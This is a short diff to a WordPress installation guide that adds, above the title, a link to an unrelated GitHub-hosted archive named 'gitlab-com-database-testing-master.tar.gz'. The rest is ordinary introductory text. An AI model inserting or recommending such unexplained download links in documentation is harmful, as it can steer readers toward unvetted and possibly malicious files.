@@ -1,3 +1,4 @@
+[gitlab-com-database-testing-master.tar.gz](https://github.com/WordPress/Advanced-administration-handbook/files/12045207/gitlab-com-database-testing-master.tar.gz)
 # How to install WordPress
 
 WordPress is well-known for its ease of installation. Under most circumstances, installing WordPress is a very simple process and takes less than five minutes to complete. [Many web hosts](#) now offer [tools (e.g. Fantastico) to automatically install WordPress](https://wordpress.org/documentation/article/automated-installation/) for you. However, if you wish to install WordPress yourself, the following guide will help.
